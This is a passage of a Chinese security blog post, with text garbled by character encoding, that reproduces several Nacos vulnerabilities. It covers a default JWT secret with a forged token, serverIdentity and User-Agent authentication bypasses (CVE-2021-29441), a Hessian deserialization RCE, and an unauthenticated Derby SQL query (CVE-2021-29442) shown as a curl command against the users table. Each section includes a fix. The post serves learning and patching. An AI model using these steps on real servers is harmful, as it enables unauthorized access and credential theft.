class="hljs-comment">### The default token:</span><br><span class="hljs-attr">nacos.core.auth.default.token.secret.key</span>=SecretKey012345678901234567890123456789012345678901234567890123456789<br></code></pre></td></tr></table></figure><p><em><strong>2.2 ç¯å¢ƒæ­å»º</strong></em></p><p>Nacos gtihubä¸‹è½½åœ°å€</p><p><a href="https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1">https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1</a><br>win10ç¯å¢ƒæ­å»º</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#è¿›å…¥nacos/binä¸‹æ‰§è¡Œ</span><br>startup.cmd -m standalone<br><br><span class="hljs-comment">#æ­å»ºæˆåŠŸåè®¿é—®å¯çœ‹åˆ°nacosç™»é™†ç•Œé¢</span><br>http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8848</span><span class="hljs-regexp">/nacos/i</span>ndex.html<span class="hljs-comment">#/login</span><br></code></pre></td></tr></table></figure><p><em><strong>2.3 æ¼æ´éªŒè¯</strong></em></p><p>å°†é»˜è®¤keyæ‹¿åˆ°åœ¨çº¿çš„jwtç”Ÿæˆç½‘ç«™ï¼š<a href="https://jwt.io/">https://jwt.io/</a></p><p>ä»¥åŠç”Ÿæˆä¸€ä¸ªæ¯”å½“å‰ç³»ç»Ÿæ—¶é—´æ™šçš„unixæ—¶é—´æˆ³ï¼Œå¡«åˆ°payloadä¸­ï¼Œå¦‚å›¾</p><p>ä¾‹å¦‚æˆ‘ç°åœ¨ç³»ç»Ÿæ—¶é—´ä¸º2024-09-10ï¼Œæ‰€ä»¥æˆ‘å¡«2024-09-11ï¼Œæ¯”ç³»ç»Ÿæ—¶é—´æ™šå°±å¯ä»¥</p><p><img src="https://img1.plumstar.cn/upload5image-20240910195125365.png"></p><p><img src="https://img1.plumstar.cn/upload5image-20240910195101909.png"></p><p>æ‹¿åˆ°æˆ‘ä»¬æ„é€ çš„accessToken</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">eyJhbGciOiJIUzI<span class="hljs-number">1</span>NiJ<span class="hljs-number">9</span>.eyJzdWIiOiJuYWNvcyIsImV<span class="hljs-number">4</span>cCI<span class="hljs-number">6</span>IjE<span class="hljs-number">3</span>MjYwNTUzMDAifQ.<span class="hljs-number">6</span>eDNR<span class="hljs-number">9</span>V<span class="hljs-number">3</span><span class="hljs-keyword">x</span><span class="hljs-number">7</span>_H<span class="hljs-number">4</span>bGIsGejg<span class="hljs-number">7</span>TGc-K<span class="hljs-number">8</span>pWaHLE<span class="hljs-number">8</span>GIHqi<span class="hljs-number">5</span><span class="hljs-keyword">gc</span><br></code></pre></td></tr></table></figure><p>ç„¶åå¸¦ä¸Šæˆ‘ä»¬æ„é€ çš„tokenå³å¯è®¿é—®ï¼Œå› ä¸ºå°†nacos.core.auth.enabled&#x3D;trueæ‰“å¼€åï¼Œé»˜è®¤åªæœ‰tokenéªŒè¯é€šè¿‡çš„ç”¨æˆ·æ‰èƒ½è®¿é—®è¯¥é¡µé¢å’Œæ·»åŠ æ–°ç”¨æˆ·ï¼Œç”šè‡³å¯ä»¥ä¸éœ€è¦æ·»åŠ ç”¨æˆ·ç›´æ¥ç™»é™†è¿›å»</p><p><img src="https://img1.plumstar.cn/upload5image-20240910195406580.png"></p><p>å¯ä»¥çœ‹åˆ°è¿”å›200ï¼Œè¯æ˜ç™»é™†æˆåŠŸäº†ï¼Œæ·»åŠ ç”¨æˆ·ä¹Ÿæ˜¯è·Ÿä¸Šé¢ä¸€æ ·çš„æ“ä½œï¼Œåªä¸è¿‡åŠ ä¸ªæˆ‘ä»¬ä¼ªé€ çš„acessTokenå°±å¥½ã€‚</p><p><img src="https://img1.plumstar.cn/upload5image-20240910195631265.png"></p><p><em><strong>2.4 æ¼æ´åŸç†</strong></em></p><p><img src="https://img1.plumstar.cn/upload5image-20240910200921178.png"></p><p><em><strong>2.5 ä¿®å¤æ–¹æ¡ˆ</strong></em></p><p>ä¿®æ”¹é»˜è®¤çš„nacos.core.auth.default.token.secret.key</p><h2 id="èº«ä»½è®¤è¯serverIdentityç»•è¿‡"><a href="#èº«ä»½è®¤è¯serverIdentityç»•è¿‡" class="headerlink" title="èº«ä»½è®¤è¯serverIdentityç»•è¿‡"></a>èº«ä»½è®¤è¯serverIdentityç»•è¿‡</h2><p><em><strong>3.1 æ¼æ´ç®€ä»‹</strong></em></p><p>æ›´åˆé€‚çš„è¯´æ³•æ˜¯å±é™©é…ç½®é€ æˆçš„é‰´æƒä¸ä¸¥ï¼Œå…¶å®ä¹Ÿç®—æ˜¯å¼±å£ä»¤ï¼Œå› ä¸º</p><p><em><strong>3.2 ç¯å¢ƒæ­å»º</strong></em></p><p>é…ç½®å¦‚ä¸‹çš„æ—¶å€™å°±ä¼šé€ æˆè¿™ä¸ªç»•è¿‡å¯ç”¨ï¼Œ1.4.1ç‰ˆæœ¬å¤ç°æˆåŠŸï¼Œ2.0.0ç‰ˆæœ¬å¤ç°å¤±è´¥ï¼Œå› ä¸ºæœ‰å‡ ä¸ªé…ç½®å¹¶æœªå­˜åœ¨</p><p><img src="https://img1.plumstar.cn/upload5image-20240911142034731.png"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">### ç‰ˆæœ¬ä¸º1.4.1</span><br><span class="hljs-comment">### If turn on auth system:</span><br><span class="hljs-attr">nacos.core.auth.enabled</span>=<span class="hljs-literal">true</span><br><br><span class="hljs-comment">### Since 1.4.1, Turn on/off white auth for user-agent: nacos-server, only for upgrade from old version.</span><br><span class="hljs-attr">nacos.core.auth.enable.userAgentAuthWhite</span>=<span class="hljs-literal">false</span> //åŸé…ç½®é»˜è®¤ä¸º<span class="hljs-literal">true</span><br><br><span class="hljs-comment">### Since 1.4.1, worked when nacos.core.auth.enabled=true and nacos.core.auth.enable.userAgentAuthWhite=false.</span><br><span class="hljs-comment">### The two properties is the white list for auth and used by identity the request from other server.</span><br><span class="hljs-attr">nacos.core.auth.server.identity.key</span>=serverIdentity //åŸé…ç½®è¿™é‡Œé»˜è®¤ä¸ºç©º<br><span class="hljs-attr">nacos.core.auth.server.identity.value</span>=security //åŸé…ç½®é»˜è®¤ä¸ºç©º<br><br><span class="hljs-comment">### The default token (Base64 String) and len(key)&gt;32:å…³äºè¿™ä¸€æ®µï¼Œæˆ‘çœ‹å¥½å¤šå¸ˆå‚…éƒ½å†™ä¸Šäº†ï¼Œä½†æ˜¯æˆ‘å®é™…æµ‹è¯•çš„æ—¶å€™å‘ç°1.4.1ç‰ˆæœ¬å¹¶æœªæœ‰è¿™ä¸ªé»˜è®¤é…ç½®è€Œä¸”æˆ‘å¹¶æ²¡æœ‰åŠ åªæ˜¯ä¿®æ”¹äº†ä¸Šæ–¹å››ä¸ªé…ç½®å°±å¯ä»¥å¤ç°æˆåŠŸ</span><br><span class="hljs-attr">nacos.core.auth.plugin.nacos.token.secret.key</span>=MTIzNDU2Nzg5MTIzMTI0MzIxNDM2NTRmYmRmMzI0c2R2c2Rh<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20240911141217760.png"></p><p><em><strong>3.3 æ¼æ´éªŒè¯</strong></em></p><p>åœ¨è¯·æ±‚å¤´ä¸­serverIdentity:securityå³å¯ç»•è¿‡jwté‰´æƒï¼ŒæœªåŠ åˆ™è¯·æ±‚å¤±è´¥</p><p><img src="https://img1.plumstar.cn/upload5image-20240911141638210.png"></p><p><em><strong>3.4 æ¼æ´åŸç†</strong></em></p><p>é¦–å…ˆé€»è¾‘æ˜¯æ ¹æ®å‰é¢çš„åˆ†æåˆ¤æ–­æ˜¯å¦å¼€å¯nacos.core.auth.enabledå’Œæ˜¯å¦å¼€å¯userAgentAuthWhiteï¼Œç„¶åæ˜¯å¯¹é…ç½®æ–‡ä»¶æ˜¯å¦é…ç½®äº†identity.key&amp;identity.valueï¼Œè‹¥é…ç½®äº†åˆ™æ£€æµ‹ä¸é…ç½®æ–‡ä»¶æ˜¯å¦ç›¸åŒï¼Œç›¸åŒåˆ™å…è®¸é€šè¿‡ã€‚</p><p><em><strong>3.5 æ¼æ´ä¿®å¤</strong></em></p><p>identity.key&amp;identity.valueçš„å€¼å…¶å®æ˜¯è‡ªå®šä¹‰çš„ï¼Œè¿™ä¸ªå®‰å…¨éšæ‚£æ›´åƒå¼±å£ä»¤ï¼Œå»ºè®®ç›´æ¥æ›´æ–°ç‰ˆæœ¬ã€‚</p><h2 id="Nacosè¯·æ±‚å¤´User-Agentç»•è¿‡é‰´æƒ"><a href="#Nacosè¯·æ±‚å¤´User-Agentç»•è¿‡é‰´æƒ" class="headerlink" title="Nacosè¯·æ±‚å¤´User-Agentç»•è¿‡é‰´æƒ"></a>Nacosè¯·æ±‚å¤´User-Agentç»•è¿‡é‰´æƒ</h2><p><em><strong>4.1 æ¼æ´ç®€ä»‹</strong></em></p><p>æ¼æ´ç¼–å·ï¼šCVE-2021-29441</p><p>åœ¨Nacosçš„é‰´æƒç®¡ç†ä¸­ï¼Œæœ‰ä¸€é¡¹é…ç½®æ˜¯é€šè¿‡User-Agentä¸­æ˜¯å¦åŒ…å«Nacos-Serveræ¥è¿›è¡Œåˆ¤æ–­è¯·æ±‚æ˜¯å¦æ¥è‡ªå…¶ä»–æœåŠ¡ç«¯ã€‚</p><p>é…ç½®æ–‡ä»¶ä¸­<code>nacos.core.auth.enable.userAgentAuthWhite = true</code>ï¼Œå°±ä¼šè·å–è¯·æ±‚å¤´ä¸­UserAgentçš„å€¼ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦æ˜¯ä»¥å­—ç¬¦ä¸²<code>Nacos-Server</code>ä¸ºå¼€å¤´ï¼Œè‹¥æ˜¯åˆ™ç›´æ¥è·³è¿‡é‰´æƒã€‚</p><p><strong>å½±å“ç‰ˆæœ¬</strong>ï¼šNacos &lt;&#x3D; 2.0.0-ALPHA.1</p><p><em><strong>4.2 ç¯å¢ƒæ­å»º</strong></em></p><p>ç‰ˆæœ¬é€‰æ‹©ä½äº2.00å³å¯ï¼Œå¦å¤–è¿™ä¸ªæ¼æ´vulhubä¹Ÿæœ‰ï¼Œä¹Ÿå¯ä»¥ä¸€é”®åŒ–éƒ¨ç½²ï¼Œæˆ‘è¿™é‡Œæ˜¯vulhubçš„ï¼Œè‡ªå·±åŠ¨æ‰‹çš„è¯å»ºè®®1.4.1ï¼Œå› ä¸º2.0.0æˆ‘æ²¡è¯•è¿‡</p><p>é…ç½®æ–‡ä»¶å¦‚ä¸‹</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">nacos.core.auth.enable.userAgentAuthWhite</span>=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20240911115820037.png"></p><p><em><strong>4.3 æ¼æ´éªŒè¯</strong></em></p><p>åŠ UAåæˆåŠŸç»•è¿‡é‰´æƒï¼Œä¸åŠ UAå¤±è´¥</p><p><img src="https://img1.plumstar.cn/upload5image-20240911125025223.png"></p><p><em><strong>4.4 æ¼æ´åŸç†</strong></em></p><p>ç›¸å…³ä»£ç æ–‡ä»¶æ˜¯core&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;nacos&#x2F;core&#x2F;auth&#x2F;AuthFilter.java<br>è¿™é‡Œçš„é€»è¾‘ä¹Ÿå¾ˆç®€å•ï¼Œå¦‚æœauthConfigs.isEnableUserAgentAuthWhite()å³é…ç½®æ–‡ä»¶ä¸­ nacos.core.auth.enable.userAgentAuthWhite ä¸ºtrueï¼Œå°±ä¼šè·å–è¯·æ±‚å¤´ä¸­UserAgentçš„å€¼ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦æ˜¯ä»¥å­—ç¬¦ä¸²â€œNacos-Serverâ€ä¸ºå¼€å¤´ï¼Œè‹¥æ˜¯åˆ™ç›´æ¥è·³è¿‡é‰´æƒã€‚<br>StringUtils.startsWith(userAgent, Constants.NACOS_SERVER_HEADER)</p><p><img src="https://img1.plumstar.cn/upload5image-20240911143925510.png"></p><p><em><strong>4.5 æ¼æ´ä¿®å¤</strong></em></p><p>æ›´æ”¹é…ç½®æ–‡ä»¶ä¸­é»˜è®¤é€‰é¡¹</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">nacos.core.auth.enable.userAgentAuthWhite</span>=<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h2 id="å¯¹User-Agentç»•è¿‡é‰´æƒçš„bypass"><a href="#å¯¹User-Agentç»•è¿‡é‰´æƒçš„bypass" class="headerlink" title="å¯¹User-Agentç»•è¿‡é‰´æƒçš„bypass"></a>å¯¹User-Agentç»•è¿‡é‰´æƒçš„bypass</h2><p>æ˜¯å¯¹ä¸Šä¸€ä¸ªuser-agentçš„bypassï¼Œå®˜æ–¹ä¿®å¤äº†ä¹‹åä¸‰æ¢¦å¸ˆå‚…åˆå‘ç°äº†å¦ä¸€ç§æ–¹æ³•ï¼Œå¯ä»¥ç»•è¿‡ä¿®å¤</p><p>ä¸è¿‡å¼€å‘è€…ç›´æ¥åˆ é™¤äº†æ¼æ´ç‰ˆæœ¬çš„1.4.1ï¼ˆä¸‰æ¢¦å¸ˆå‚…æ˜¯Jan 14 æçš„issueï¼Œç„¶åå°è£…å¥½çš„serverç«¯æ˜¯ç›´æ¥æ›´æ¢ä¿®å¤åçš„äº†ï¼Œä¸è¿‡Source codeæ²¡æœ‰æ¢ï¼‰ï¼Œè€Œä½ç‰ˆæœ¬ä¸­æ²¡æœ‰å¯¹åº”é…ç½®é¡¹ã€‚æ‰€ä»¥æƒ³è¦å¤ç°è¯•è¯•çš„å¯ä»¥é€šè¿‡æºç ç¼–è¯‘çš„æ–¹å¼è·å–ç¯å¢ƒï¼Œæˆ‘è¿™é‡Œå°±ä¸è¯¦ç»†å†™äº†ï¼Œæ„Ÿè§‰ä¸‰æ¢¦å¸ˆå‚…å’Œè°¢å¸ˆå‚…å†™çš„å·²ç»å¾ˆæ˜“æ‡‚äº†ï¼Œæˆ‘è¿™ç§èœé¸Ÿéƒ½èƒ½çœ‹æ‡‚ï¼Œæ„Ÿå…´è¶£çš„ç§»æ­¥ä¸¤ä½å¸ˆå‚…æ–‡ç« </p><p><a href="https://xz.aliyun.com/t/15151?time__1311=GqjxuQD=cDlx0nD2DUxYwrIDcmYwhjox#toc-5">https://xz.aliyun.com/t/15151?time__1311=GqjxuQD%3DcDlx0nD2DUxYwrIDcmYwhjox#toc-5</a></p><p><a href="https://github.com/alibaba/nacos/issues/4701">https://github.com/alibaba/nacos/issues/4701</a></p><p>å…¶å®æ˜¯æˆ‘æ¯”è¾ƒæ‡’hhh</p><h1 id="Nacos-Jraft-Hessian-ååºåˆ—åŒ–æ¼æ´"><a href="#Nacos-Jraft-Hessian-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="Nacos Jraft Hessian ååºåˆ—åŒ–æ¼æ´"></a>Nacos Jraft Hessian ååºåˆ—åŒ–æ¼æ´</h1><h2 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a><em>æ¼æ´æè¿°</em></h2><p>Nacosé»˜è®¤çš„7848ç«¯å£æ˜¯ç”¨æ¥å¤„ç†é›†ç¾¤æ¨¡å¼ä¸‹raftåè®®çš„é€šä¿¡ï¼Œè¯¥ç«¯å£çš„æœåŠ¡åœ¨å¤„ç†éƒ¨åˆ†jraftè¯·æ±‚çš„æ—¶å€™ä½¿ç”¨hessianä¼ è¾“åè®®è¿›è¡Œååºåˆ—åŒ–è¿‡æ»¤ä¸ä¸¥ï¼Œå¯¼è‡´RCEã€‚</p><p>**æ¼æ´ç¼–å·ï¼š**CNVD-2023-45001</p><p><strong>å½±å“ç‰ˆæœ¬</strong>:</p><ul><li>1.4.0 &lt;&#x3D; Nacos &lt; 1.4.6ï¼ˆä½¿ç”¨clusteré›†ç¾¤æ¨¡å¼è¿è¡Œï¼‰</li><li>2.0.0 &lt;&#x3D; Nacos &lt; 2.2.3ï¼ˆä»»æ„æ¨¡å¼è¿è¡Œï¼‰</li></ul><p>æ­å»ºç¯å¢ƒï¼Œdockerä¸€é”®éƒ¨ç½²2.0.0</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> pull nacos/nacos-server:<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> # æ‹‰å–<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>ç‰ˆæœ¬çš„nacos<br><span class="hljs-attribute">docker</span> run --name nacos -d -p <span class="hljs-number">8848</span>:<span class="hljs-number">8848</span> -p <span class="hljs-number">7848</span>:<span class="hljs-number">7848</span> -e MODE=standalone nacos/nacos-server:<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="æ¼æ´æ£€æµ‹"><a href="#æ¼æ´æ£€æµ‹" class="headerlink" title="æ¼æ´æ£€æµ‹"></a><em>æ¼æ´æ£€æµ‹</em></h2><p>å»ºè®®ç›´æ¥å·¥å…·æ¢­å“ˆï¼Œæ–¹ä¾¿å¿«æ·ï¼Œå…·ä½“é£Ÿç”¨æ•™ç¨‹çœ‹ä½œè€…æ–‡æ¡£å°±å¥½</p><p><a href="https://github.com/c0olw/NacosRce">https://github.com/c0olw/NacosRce</a></p><p><img src="https://img1.plumstar.cn/upload5image-20240911183407539.png"></p><p>å†…å­˜é©¬æ‰“è¿›å»äº†ï¼Œå†°èå“¥æ–¯æ‹‰ä»€ä¹ˆçš„å»è¿ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œè¿™é‡Œå°±ä¸å¤šå†™äº†</p><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a><em>æ¼æ´åŸç†</em></h2><p>å…³äºåŸç†ï¼Œè¿™ç¯‡æ–‡ç« æš‚æ—¶ä¸å†™ï¼Œä»¥åä¼šä¸ä¼šå‡ºï¼Œä¸å¤ªç¡®å®šï¼Œå­—æ•°æœ‰ç‚¹å¤šï¼Œå¤§å®¶å¯ä»¥å…ˆçœ‹<strong>p1g3</strong>å¸ˆå‚…çš„æ–‡ç« å­¦ä¹ </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://exp.ci/<span class="hljs-number">2023</span>/<span class="hljs-number">06</span>/<span class="hljs-number">14</span>/Nacos-JRaft-Hessian-ååºåˆ—åŒ–åˆ†æ/<br></code></pre></td></tr></table></figure><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a><em>æ¼æ´ä¿®å¤</em></h2><p>ç›®å‰ï¼Œå®˜æ–¹å·²å‘å¸ƒæ–°ç‰ˆæœ¬ä¿®å¤äº†è¯¥æ¼æ´ï¼Œè¯·å—å½±å“çš„ç”¨æˆ·å‡çº§åˆ°å®‰å…¨ç‰ˆæœ¬ï¼š</p><p><a href="https://github.com/alibaba/nacos/releases/tag/1.4.6">https://github.com/alibaba/nacos/releases/tag/1.4.6</a></p><p><a href="https://github.com/alibaba/nacos/releases/tag/2.2.3">https://github.com/alibaba/nacos/releases/tag/2.2.3</a></p><p><strong>ä¸´æ—¶ç¼“è§£æªæ–½ï¼š</strong></p><p>è¯¥æ¼æ´ä»…å½±å“7848ç«¯å£ï¼ˆé»˜è®¤è®¾ç½®ä¸‹ï¼‰ï¼Œè¯¥ç«¯å£æ˜¯Nacosé›†ç¾¤é—´Raftåè®®çš„é€šä¿¡ç«¯å£ï¼Œä¸æ‰¿è½½å®¢æˆ·ç«¯è¯·æ±‚ï¼Œå¦‚æœå—å½±å“çš„ç”¨æˆ·æ— æ³•åŠæ—¶å‡çº§ï¼Œå¯é€šè¿‡ç¦æ­¢è¯¥ç«¯å£çš„è¯·æ±‚æ¥ç¼“è§£æ­¤æ¼æ´ã€‚</p><h1 id="Derbyæœªæˆæƒ-SQLæ³¨å…¥"><a href="#Derbyæœªæˆæƒ-SQLæ³¨å…¥" class="headerlink" title="Derbyæœªæˆæƒ-&gt;SQLæ³¨å…¥"></a>Derbyæœªæˆæƒ-&gt;SQLæ³¨å…¥</h1><h2 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a><em>æ¼æ´ç®€ä»‹</em></h2><p>nacoså¸¦æœ‰ä¸€ä¸ªåµŒå…¥å¼çš„å°å‹æ•°æ®åº“derbyï¼Œè€Œåœ¨ç‰ˆæœ¬&lt;&#x3D;1.4.0çš„é»˜è®¤é…ç½®éƒ¨ç½²nacosçš„æƒ…å†µä¸‹ï¼Œå®ƒæ— éœ€è®¤è¯å³å¯è¢«è®¿é—®ï¼Œå¹¶æ‰§è¡Œä»»æ„sqlæŸ¥è¯¢ï¼Œå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œè€ŒCVE-2021-29442æ˜¯å› ä¸ºæœ€å¼€å§‹å¼€å‘è€…æ²¡æœ‰ä¸ºè¿™ä¸ªå†…å­˜å‹æ•°æ®åº“æ¥å£é…ç½®ä»»ä½•çš„è®¿é—®æ§åˆ¶å¼•å‘çš„ã€‚</p><p><strong>å½±å“ç‰ˆæœ¬</strong>ï¼šNacos &lt;&#x3D; 1.4.0ï¼›æ¼æ´ç¼–å·ï¼šCVE-2021-29442</p><p>æ¼æ´ç¯å¢ƒç”¨1.4.0è¿›è¡Œæµ‹è¯•ï¼Œä¹Ÿå¯ä»¥ç”¨vulhubæ­å»ºå¥½åƒï¼Œå¤§å®¶å¯ä»¥è¯•è¯•</p><h2 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a><em>æ¼æ´éªŒè¯</em></h2><p>æ‰‹å·¥éªŒè¯ï¼š</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">curl -XGET <span class="hljs-string">&quot;http://192.168.92.1:8848/nacos/v1/cs/ops/derby?sql=select<span class="hljs-variable">%20</span>*<span class="hljs-variable">%2</span>0from<span class="hljs-variable">%2</span>0users<span class="hljs-variable">%20</span>&quot;</span><br></code></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿå¯ä»¥å‘æ•°æ®åŒ…è¯•è¯•ï¼Œsqlè¯­å¥ä¸ºï¼š<code>select * from users</code>ï¼Œå…¶ä»–æ³¨å…¥è¯­å¥ä¹Ÿæ˜¯ä¸€æ ·çš„</p><p><img src="https://img1.plumstar.cn/upload5image-20240911151413140.png"></p><p>è¿›é˜¶åˆ©ç”¨æ˜¯å¯ä»¥ç›´æ¥ç”¨ä¸‹æ–¹çš„ä»£ç æ¥ç ´è§£æ­¤å¤„æŸ¥å‡ºæ¥çš„ç”¨æˆ·å¯†ç çš„ï¼Œæ¯•ç«ŸåŠ å¯†æ–¹å¼æ˜¯å…¬å¼€çš„</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs typescript">package com.<span class="hljs-property">alibaba</span>.<span class="hljs-property">nacos</span>.<span class="hljs-property">console</span>.<span class="hljs-property">utils</span>;<br><br><span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">security</span>.<span class="hljs-property">crypto</span>.<span class="hljs-property">bcrypt</span>.<span class="hljs-property">BCryptPasswordEncoder</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Password encoder tool.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> <span class="hljs-variable">nacos</span></span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PasswordEncoderUtil</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-title class_">String</span>[] args</span>) &#123;<br>        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>().<span class="hljs-title function_">encode</span>(<span class="hljs-string">&quot;nacos&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">Boolean</span> <span class="hljs-title function_">matches</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> raw, <span class="hljs-title class_">String</span> encoded</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>().<span class="hljs-title function_">matches</span>(raw, encoded);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> raw</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>().<span class="hljs-title function_">encode</span>(raw);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ¼æ´åŸç†-1"><a href="#æ¼æ´åŸç†-1" class="headerlink" title="æ¼æ´åŸç†"></a><em>æ¼æ´åŸç†</em></h2><p>æ¼æ´ä»£ç åœ¨config\src\main\java\com\alibaba\nacos\config\server\controller\ConfigOpsController.java#derbyOps</p><p><img src="https://img1.plumstar.cn/upload5image-20240911154206474.png"></p><p>è·Ÿè¿›ä¸€ä¸‹çœ‹ä¸€çœ¼ï¼Œç¬¬ä¸€ä¸ªifçš„å€¼å–å†³äºæ˜¯å¦standaloneæ¨¡å¼å¯åŠ¨çš„nacosï¼Œæ‰€ä»¥åœ¨standaloneæ¨¡å¼å¯åŠ¨nacosçš„è¯ï¼Œé»˜è®¤å°±å¯ä»¥è¿›å…¥ç¬¬ä¸€ä¸ªif</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">PropertyUtil<span class="hljs-selector-class">.isEmbeddedStorage</span>()<br>ApplicationUtils<span class="hljs-selector-class">.getStandaloneMode</span>()<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20240911154534373.png"></p><p>è·Ÿè¿›çœ‹ä¸€ä¸‹embeddedStorage</p><p><img src="https://img1.plumstar.cn/upload5image-20240911155232187.png"></p><p>è·Ÿè¿›getStandaloneMode()ï¼Œæ‰¾åˆ°è¿™ä¸ªæ–¹æ³•ï¼Œæˆ‘IDEAä¸çŸ¥é“å“ªé‡Œå‡ºäº†é—®é¢˜ï¼Œæ–¹æ³•è·Ÿè¿›ä¸è¿‡å»ï¼Œåªèƒ½æœä¸€ä¸‹æ‰¾åˆ°å®šä¹‰æ–¹æ³•çš„åœ°æ–¹</p><p><img src="https://img1.plumstar.cn/upload5image-20240911155532930.png"></p><p>ç¬¬äºŒä¸ªifä¹Ÿä»…ä»…æ˜¯åˆ¤æ–­äº†å‚æ•°sqlçš„å€¼æ˜¯å¦ä»¥â€selectâ€ä¸ºå­—ç¬¦ä¸²å¼€å¤´ï¼Œç„¶åå°±ç›´æ¥å¯ä»¥ä½¿ç”¨derbyçš„æŸ¥è¯¢åŠŸèƒ½äº†ã€‚</p><h2 id="ä¿®å¤æ–¹æ¡ˆ"><a href="#ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆ"></a><em>ä¿®å¤æ–¹æ¡ˆ</em></h2><p>å‚è€ƒ1.4.1ä¸­æ­¤å¤„çš„ä»£ç ï¼Œæ·»åŠ äº†nacos&#x2F;admin çš„æ³¨è§£æ¥é™åˆ¶ä»…ç®¡ç†å‘˜è§’è‰²ä½¿ç”¨è¯¥æ¥å£(NacosåŸºäºSpring Securityæ¥åšäº†è®¿é—®æ§åˆ¶)</p><p><img 